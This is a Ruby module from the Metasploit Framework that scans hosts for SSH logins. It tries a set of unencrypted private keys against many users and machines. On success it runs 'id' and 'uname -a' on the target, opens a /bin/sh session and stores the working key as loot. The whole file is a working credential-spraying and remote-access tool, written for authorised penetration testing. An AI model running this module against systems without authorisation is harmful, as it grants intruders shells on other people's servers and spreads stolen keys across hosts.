##
# $Id: ssh_login_pubkey.rb 13407 2011-07-29 15:51:11Z todb $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'net/ssh'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::CommandShell

	attr_accessor :ssh_socket, :good_credentials, :good_key

	def initialize
		super(
			'Name'        => 'SSH Public Key Login Scanner',
			'Version'     => '$Revision: 13407 $',
			'Description' => %q{
				This module will test ssh logins on a range of machines using
				a defined private key file, and report successful logins.
				If you have loaded a database plugin and connected to a database
				this module will record successful logins and hosts so you can
				track your access.

				Note that password-protected key files will not function with this
				module -- it is designed specifically for unencrypted (passwordless)
				keys.

				Key files may be a single private (unencrypted) key, or several private
				keys concatenated together as an ASCII text file. Non-key data should be
				silently ignored.
			},
			'Author'      => ['todb'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(22),
				OptPath.new('KEY_FILE', [false, 'Filename of one or several cleartext private keys.'])
			], self.class
		)

		register_advanced_options(
			[
				OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false]),
				OptString.new('SSH_KEYFILE_B64', [false, 'Raw data of an unencrypted SSH public key. This should be used by programmatic interfaces to this module only.', '']),
				OptPath.new('KEY_DIR', [false, 'Directory of several cleartext private keys. Filenames must not begin with a dot, or end in ".pub" in order to be read.'])
			]
		)

		deregister_options('RHOST','PASSWORD','PASS_FILE','BLANK_PASSWORDS','USER_AS_PASS')

		@good_credentials = {}
		@good_key = ''
		@strip_passwords = true

	end

	def key_dir
		datastore['KEY_DIR']
	end

	def rport
		datastore['RPORT']
	end

	def ip
		datastore['RHOST']
	end

	def read_keyfile(file)
		if file == :keyfile_b64
			keyfile = datastore['SSH_KEYFILE_B64'].unpack("m*").first
		elsif file.kind_of? Array
			keyfile = ''
			file.each do |dir_entry|
				next unless File.readable? dir_entry
				keyfile << File.open(dir_entry, "rb") {|f| f.read(f.stat.size)}
			end
		else
			keyfile = File.open(file, "rb") {|f| f.read(f.stat.size)}
		end
		keys = []
		this_key = []
		in_key = false
		keyfile.split("\n").each do |line|
			in_key = true if(line =~ /^-----BEGIN [RD]SA PRIVATE KEY-----/)
			this_key << line if in_key
			if(line =~ /^-----END [RD]SA PRIVATE KEY-----/)
				in_key = false
				keys << (this_key.join("\n") + "\n")
				this_key = []
			end
		end
		if keys.empty?
			print_error "#{ip}:#{rport} SSH - No keys found."
		end
		return validate_keys(keys)
	end

	# Validates that the key isn't total garbage. Also throws out SSH2 keys --
	# can't use 'em for Net::SSH.
	def validate_keys(keys)
		keepers = []
		keys.each do |key|
			# Needs a beginning
			next unless key =~ /^-----BEGIN [RD]SA PRIVATE KEY-----\x0d?\x0a/m
			# Needs an end
			next unless key =~ /\n-----END [RD]SA PRIVATE KEY-----\x0d?\x0a?$/m
			# Shouldn't have binary.
			next unless key.scan(/[\x00-\x08\x0b\x0c\x0e-\x1f\x80-\xff]/).empty?
			# Add more tests to taste.
			keepers << key
		end
		if keepers.empty?
			print_error "#{ip}:#{rport} SSH - No valid keys found"
		end
		return keepers
	end

	def pull_cleartext_keys(keys)
		cleartext_keys = []
		keys.each do |key|
			next unless key
			next if key =~ /Proc-Type:.*ENCRYPTED/
			this_key = key.gsub(/\x0d/,"")
			next if cleartext_keys.include? this_key
			cleartext_keys << this_key 
		end
		if cleartext_keys.empty?
			print_error "#{ip}:#{rport} SSH - No valid cleartext keys found"
		end
		return cleartext_keys
	end

	def do_login(ip,user,port)
		if datastore['KEY_FILE'] and File.readable?(datastore['KEY_FILE'])
			keys = read_keyfile(datastore['KEY_FILE'])
			@keyfile_path = datastore['KEY_FILE'].dup
			cleartext_keys = pull_cleartext_keys(keys)
			msg = "#{ip}:#{rport} SSH - Trying #{cleartext_keys.size} cleartext key#{(cleartext_keys.size > 1) ? "s" : ""} per user."
		elsif datastore['SSH_KEYFILE_B64'] && !datastore['SSH_KEYFILE_B64'].empty?
			keys = read_keyfile(:keyfile_b64)
			cleartext_keys = pull_cleartext_keys(keys)
			msg = "#{ip}:#{rport} SSH - Trying #{cleartext_keys.size} cleartext key#{(cleartext_keys.size > 1) ? "s" : ""} per user (read from datastore)."
		elsif datastore['KEY_DIR']
			@keyfile_path = datastore['KEY_DIR'].dup
			return :missing_keyfile unless(File.directory?(key_dir) && File.readable?(key_dir))
			unless @key_files
				@key_files = Dir.entries(key_dir).reject {|f| f =~ /^\x2e/ || f =~ /\x2epub$/}
			end
			these_keys = @key_files.map {|f| File.join(key_dir,f)}
			keys = read_keyfile(these_keys)
			cleartext_keys = pull_cleartext_keys(keys)
			msg = "#{ip}:#{rport} SSH - Trying #{cleartext_keys.size} cleartext key#{(cleartext_keys.size > 1) ? "s" : ""} per user."
		else
			return :missing_keyfile
		end
		unless @alerted_with_msg
			print_status msg
			@alerted_with_msg = true
		end
		cleartext_keys.each_with_index do |key_data,key_idx|
			opt_hash = {
				:auth_methods => ['publickey'],
				:msframework  => framework,
				:msfmodule    => self,
				:port         => port,
				:key_data     => key_data,
				:record_auth_info => true
			}
			opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']
			begin
				self.ssh_socket = Net::SSH.start(
					ip,
					user,
					opt_hash
				)
			rescue Rex::ConnectionError, Rex::AddressInUse
				return :connection_error
			rescue Net::SSH::Disconnect, ::EOFError
				return :connection_disconnect
			rescue Net::SSH::AuthenticationFailed
				# Try, try, again
				if @key_files
					vprint_error "#{ip}:#{rport} - SSH - Failed authentication, trying key #{@key_files[key_idx+1]}"
				else
					vprint_error "#{ip}:#{rport} - SSH - Failed authentication, trying key #{key_idx+1}"
				end
				next
			rescue Net::SSH::Exception => e
				return [:fail,nil] # For whatever reason.
			end
			break
		end

		if self.ssh_socket
			self.good_key = self.ssh_socket.auth_info[:pubkey_id]
			proof = ''
			begin
				Timeout.timeout(5) do
					proof = self.ssh_socket.exec!("id\nuname -a").to_s
					if(proof !~ /id=/)
						proof << self.ssh_socket.exec!("help\n?\n\n\n").to_s
					end
				end
			rescue ::Exception
			end

			# Create a new session from the socket, then dump it.
			conn = Net::SSH::CommandStream.new(self.ssh_socket, '/bin/sh', true)
			self.ssh_socket = nil

			# Clean up the stored data - need to stash the keyfile into
			# a datastore for later reuse.
			merge_me = {
				'USERPASS_FILE'  => nil,
				'USER_FILE'      => nil,
				'PASS_FILE'      => nil,
				'USERNAME'       => user
			}
			if datastore['KEY_FILE'] and !datastore['KEY_FILE'].empty?
				keyfile = File.open(datastore['KEY_FILE'], "rb") {|f| f.read(f.stat.size)}
				merge_me.merge!(
					'SSH_KEYFILE_B64' => [keyfile].pack("m*").gsub("\n",""),
					'KEY_FILE'        => nil
					)
			end

			start_session(self, "SSH #{user}:#{self.good_key} (#{ip}:#{port})", merge_me, false, conn.lsock)

			return [:success, proof]
		else
			return [:fail, nil]
		end
	end

	def do_report(ip,user,port,proof)
		store_keyfile_b64_loot(ip,user,self.good_key)
		report_auth_info(
			:host => ip,
			:port => datastore['RPORT'],
			:sname => 'ssh',
			:user => user,
			:pass => @keyfile_path,
			:type => "ssh_key",
			:proof => "KEY=#{self.good_key}, PROOF=#{proof}",
			:active => true
		)
	end

	# Sometimes all we have is a SSH_KEYFILE_B64 string. If it's 
	# good, then store it as loot for this user@host, unless we
	# already have it in loot.
	def store_keyfile_b64_loot(ip,user,key_id)
		return unless db 
		return if @keyfile_path
		return if datastore["SSH_KEYFILE_B64"].to_s.empty?
		keyfile = datastore["SSH_KEYFILE_B64"].unpack("m*").first
		keyfile = keyfile.strip + "\n"
		ktype_match = keyfile.match(/--BEGIN ([DR]SA) PRIVATE/)
		return unless ktype_match
		ktype = ktype_match[1].downcase
		ltype = "host.unix.ssh.#{user}_#{ktype}_private"
		# Assignment and comparison here, watch out!
		if loot = Msf::DBManager::Loot.find_by_ltype_and_workspace_id(ltype,myworkspace.id)
			if loot.info.include? key_id
				@keyfile_path = loot.path
			end
		end
		@keyfile_path ||= store_loot(ltype, "application/octet-stream", ip, keyfile.strip, nil, key_id)
	end

	def run_host(ip)
		print_status("#{ip}:#{rport} SSH - Testing Cleartext Keys")
		# Since SSH collects keys and tries them all on one authentication session, it doesn't
		# make sense to iteratively go through all the keys individually. So, ignore the pass variable,
		# and try all available keys for all users.
		each_user_pass do |user,pass|
			ret,proof = do_login(ip,user,rport)
			case ret
			when :success
				print_good "#{ip}:#{rport} SSH - Success: '#{user}':'#{self.good_key}' '#{proof.to_s.gsub(/[\r\n\e\b\a]/, ' ')}'"
				do_report(ip,user,rport,proof)
				:next_user
			when :connection_error
				vprint_error "#{ip}:#{rport} - SSH - Could not connect"
				:abort
			when :connection_disconnect
				vprint_error "#{ip}:#{rport} - SSH - Connection timed out"
				:abort
			when :fail
				vprint_error "#{ip}:#{rport} - SSH - Failed: '#{user}'"
			when :missing_keyfile
				vprint_error "#{ip}:#{rport} - SSH - Cannot read keyfile."
			when :no_valid_keys
				vprint_error "#{ip}:#{rport} - SSH - No cleartext keys in keyfile."
			end
		end
	end

end

